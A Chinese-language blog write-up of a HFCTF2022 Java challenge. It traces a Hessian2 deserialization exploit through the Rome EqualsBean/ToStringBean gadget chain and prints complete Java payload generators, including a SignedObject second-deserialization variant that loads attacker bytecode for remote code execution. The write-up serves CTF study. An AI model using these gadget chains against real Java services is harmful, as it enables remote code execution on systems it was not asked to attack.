<h3 id="Hessian2-反序列化"><a href="#Hessian2-反序列化" class="headerlink" title="Hessian2 反序列化"></a>Hessian2 反序列化</h3><p>Hessian2，这个是一个不同于java反序列化的东西，它实现了自己的一套序列化反序列化流程，因此其利用链也与java反序列化的利用链不一致。但其同样存在反序列化漏洞，存在着与java反序列化不同的利用链，使用marshal工具可以生成对应的payload。从给出的依赖来看可以使用链的就是Rome的jndi注入。给出了dockerfile，目标的jdk版本为8u181，可以打reference直接打通，但是compose里写了给内网，又到了经典java不出网利用环节。以及不出网的jndi应该是没法打的吧。。</p>
<p>这里一开始想试一下出网的情况下这个环境能不能打通，试了半天没反应，最后才发现。。。我用的是jdk8u311。以及marshal生成payload的时候要把ldap协议带上。。。。总觉得这个错误犯了好几次了</p>
<h3 id="Rome反序列化"><a href="#Rome反序列化" class="headerlink" title="Rome反序列化"></a>Rome反序列化</h3><p>先跟一下调用链吧。不然搞不清楚的。他这个地方反序列化打通了也不会出现报错，不像CC基本上都会崩掉直接输出调用栈好下断点。。。只能想办法找到在哪触发然后手下断点了</p>
<p>可以先看一下marshal里payload怎么写的来下断点，目测下在EqualBean和ToStringBean处，然后硬调。</p>
<p>经过了约莫大半个小时的调试，理出来了整个调用链<br>如前文所言，Hessian2实现了自己的反序列化流程，对于hashmap对象进行反序列化时，会使用一个MapDeserializer进行反序列化，其readMap方法中将map的值一一还原</p>
<pre class=" language-java"><code class="language-java">        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>in<span class="token punctuation">.</span><span class="token function">isEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>Map<span class="token punctuation">)</span>map<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code></pre>
<p>调用put方法，put方法会对key的hash进行计算，调用key的hashCode方法。而这里的key是EqualBean，其重写了hashCode方法，调用了自己的beanHashCode方法，进一步调用了自己的obj成员的toString方法<br>这里EqualBean的obj为ToStringBean，toString如下</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150900729.png" alt="image-20220323150900729"></p>
<p>ToStringBean的obj为payload JdbcRowSetImpl，prefix获取到该值进入有参数的toString方法<br>这个方法会反射的把这个类的各种getter调用一遍（看的不是很懂，但是感觉是这个样子的，不知道能不能调private的）</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323150933248.png" alt="image-20220323150933248"></p>
<p>当对databaseMetaData这个属性的getter进行调用时，调用了connect触发了lookup。</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> DatabaseMetaData <span class="token function">getDatabaseMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>
        Connection var1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">getMetaData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>说起来这个东西我一开始调试到了这个函数但是没觉得这个函数会触发就略过了。。。</p>
<p>就调试情况而言可以认为该反序列化的触发点有两个，一个是寻找重写了hashCode方法的类，另一个是ToStringBean中的任意getter调用。说起调用getter触发的反序列化，那就全自动联想fastjson的几个payload。</p>
<p>fastjson三个利用这里已经用掉一个Jdbc了，tomcat的BCEL这里没有用不了，try1try经典templatesImpl</p>
<h3 id="templatesImpl不能用"><a href="#templatesImpl不能用" class="headerlink" title="templatesImpl不能用"></a>templatesImpl不能用</h3><p>简单缝合了一下marshal，写了个templatesImpl的payload</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>rometools<span class="token punctuation">.</span>rome<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>EqualsBean<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>rometools<span class="token punctuation">.</span>rome<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>ToStringBean<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>

<span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Array<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RomeTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> <span class="token function">makeMap</span> <span class="token punctuation">(</span> Object v1<span class="token punctuation">,</span> Object v2 <span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span> Object<span class="token operator">></span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field f <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nodeC<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            nodeC <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span> ClassNotFoundException e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            nodeC <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> nodeCons <span class="token operator">=</span> nodeC<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> nodeC<span class="token punctuation">)</span><span class="token punctuation">;</span>
        nodeCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Object tbl <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>nodeC<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Array<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Array<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tbl<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nodeCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field tf <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> tbl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilCode <span class="token operator">=</span> SerializeUtil<span class="token punctuation">.</span><span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>evilCode<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        EqualsBean equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span>ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap evilMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span> equalsBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

        HessianBase hb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> hb<span class="token punctuation">.</span><span class="token function">marshal</span><span class="token punctuation">(</span>evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>codes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>然后调试一下，同上述反序列化利用链情况，通过get调用到了getOutputProperties，然后进newTransformer，getTransletInstance，defineTransletClasses。一切看起来都很顺利，而defineTransletClasses里面就有我们最喜欢的从bytecode中define class并返回出来进行newInstance的操作。然而也就是在这里出错了。这里调用了_tfactory的getExternalExtensionsMap()方法，而由于_tfactory是一个transient的变量，因此在序列化时不会被写入，也就意味着在这里是null，调用null的方法抛出了一个错误，导致该利用链失败了，fastjson是手动赋值上去并触发的，倒无所谓，也因此需要支持给private变量赋值才能使用，但那原来CC那些不也应该是这样子的吗？（我还真没思考过这个问题，或者说我没注意到这个变量是transient的。。。</p>
<p>开调！<br>CC的链随便缝一个用，这里用的是InstantiateTransformer直接newInstance的实现。快进到newInstance处<br><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151547353.png" alt="image-20220323151547353"><br>查看iArg的值，iArg就是我们写payload的时候塞在InstantiateTransformer中的templatesImpl<br><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151638420.png" alt="image-20220323151638420"></p>
<p>居然_tfactory有一个值，给我整麻了，理论上来说transient关键字的意思就是序列化的时候不会被写入啊？</p>
<p>再次得到java大师feng师傅的指导，原来是templatesImpl的readObject的最后一句直接new了一个tfactory上来。。。</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323151944239.png" alt="image-20220323151944239"></p>
<p>行吧，所以说原理就是Hessian2自己实现的反序列化中并没有对这些操作进行额外的复现，导致最后反序列化出来的templatesImpl类少了一个tfactory属性，导致payload无法触发（既然如此平常CC链序列化的时候又赋值一个tfactory又有什么意义呢。。。？序列化的时候都根本没有用过这个值。。。）</p>
<p>那么说到这里解法也就已经呼之欲出了，找到一个二次反序列化的点，并使用java原生readObject进行反序列化，即可完成整个攻击<br>上次tctf的buggyloader也是题目给的反序列化有问题找一个二次反序列化使用原生靠谱readObject打通的来着，但是这回我一开始都没弄清楚怎么回事，那个时候搜到了Rome的templatesImpl但是因为依赖包的奇怪错误坑的我有点混乱</p>
<h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>算了吧，自动化挖掘完全不会，之前codeql坐牢还没做完，并且这种闭源代码，或者说没有直接源码可以编译的情况下，codeql完全用不了。改天学一下这种东西</p>
<p>我直接抄答案<br><code>java.security.SignedObject</code><br>还有这种东西，这个类也太猛了吧，自带的二次反序列化。。。</p>
<p><img src="/images/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0/image-20220323154700790.png" alt="image-20220323154700790"></p>
<p>get触发，直接看下能不能给fastjson用，然后content是一个private属性且无setter，和templatesImpl一样了，散了。以及fastjson是对存在的类成员名对应的getter进行调用吧（没仔细跟过），这个ToStringBean的getter调用有点怪，简单跟了一下没看懂，有一个地方莫名其妙的就返回了所有的getter方法，感觉是调用所有get开头的函数，而不是根据成员变量名去寻找getter</p>
<p>总之就是能触发到getObject函数</p>
<p>然后readObject打一套正常反序列化，HashMap的readObject本身也会调用hash函数去计算hash，仍然可以使用Rome的EqualsBean这一套</p>
<p>缝合一下，得到payload</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilCode <span class="token operator">=</span> SerializeUtil<span class="token punctuation">.</span><span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        TemplatesImpl templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>evilCode<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SerializeUtil<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        ToStringBean toStringBean_t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        EqualsBean equalsBean_t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span>ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean_t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap evilMap_t <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean_t<span class="token punctuation">,</span> equalsBean_t<span class="token punctuation">)</span><span class="token punctuation">;</span>

        Signature signature <span class="token operator">=</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        KeyPairGenerator kg <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        kg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        KeyPair kp <span class="token operator">=</span> kg<span class="token punctuation">.</span><span class="token function">genKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>evilMap_t<span class="token punctuation">,</span>kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>

        ToStringBean toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span>SignedObject<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        EqualsBean equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span>ToStringBean<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashMap evilMap <span class="token operator">=</span> <span class="token function">makeMap</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span> equalsBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

        HessianBase hb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HessianBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> hb<span class="token punctuation">.</span><span class="token function">marshal</span><span class="token punctuation">(</span>evilMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>codes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>缝合的时候写了垃圾代码，ToStringBean里面塞了个TemplatesImpl类，实际上应该塞Templates类，Templates类里面只有一个getOutputProperties，而TemplatesImpl里面一堆getter，会调用到一个</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> DOM <span class="token function">getStylesheetDOM</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>DOM<span class="token punctuation">)</span>_sdom<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>而这个<code>_sdom</code>也是transient的，进行函数调用然后再次报错挂掉</p>
<p>这个师傅还提到了一个新的利用方案，因为Hessain2和java原生反序列化不一样，所以就算没有继承serializable的类也能反序列化<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/">2022虎符CTF-Java部分</a><br>不过说是低版本才有？</p>
<h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><p>已经打到rce了，现在就是经典不出网回显环节了。两个打法，一个是究极反射拿response对象直接写response，另一个是究极调试框架找filter注册点之类的地方写内存马。这种思路性的东西可以看看ha1师傅的这篇<a target="_blank" rel="external nofollow noopener noreferrer" href="https://ha1c9on.top/?p=1949">Java Memory Shell &amp; Tomcat</a><br>但是以前抄的payload都是经典tomcat回显或者spring回显，这把使用的东西看起来有点原生<code>com.sun.net.httpserver.HttpServer</code></p>
<p>抄一个项目<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/feihong-cs/Java-Rce-Echo">Java-Rce-Echo</a><br>虽然这个项目里面没有这个玩意的回显。。。</p>
<p>改天手动调，摸一下。</p>
<p>也可以直接抄ha1师傅的<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ha1c9on.top/?p=1973">虎符 2022 ezchain</a></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>调试payload触发位置的时候的坑<br>因为是ToStringBean的toString方法是最终的触发点，在IDEA进行调试的时候控制台会一直尝试去解析ToStringBean的值，就会疯狂调用toString疯狂触发payload。。。。我一开始payload写的是弹计算器，调试走一步弹一个给我整麻了</p>
<p>奇怪的依赖坑<br>直接搜rome的话搜到的依赖是</p>
<pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>这个包导入的内容和这个题目的依赖</p>
<pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.rometools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>并且他们在功能上好像没有什么区别（粗略的看了一下），但是他们两个类的完全限定名不一样。。。一个是<code>com.sun.syndication.feed.impl</code>，另一个是<code>com.rometools.rome.feed.impl</code>，这里一开始给我整迷惑了。。。然后就卡住了</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/wp/" rel="tag"># wp</a>
              <a href="/tags/Java/" rel="tag"># Java</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/CodeQL%E5%9D%90%E7%89%A2%E8%AE%B0%E5%BD%95.html" rel="prev" title="CodeQL坐牢记录">
      <i class="fa fa-chevron-left"></i> CodeQL坐牢记录
    </a></div>
      <div class="post-nav-item">
    <a href="/zer0ptsCTF2022%E5%A4%8D%E7%8E%B0.html" rel="next" title="zer0ptsCTF2022复现">
      zer0ptsCTF2022复现 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
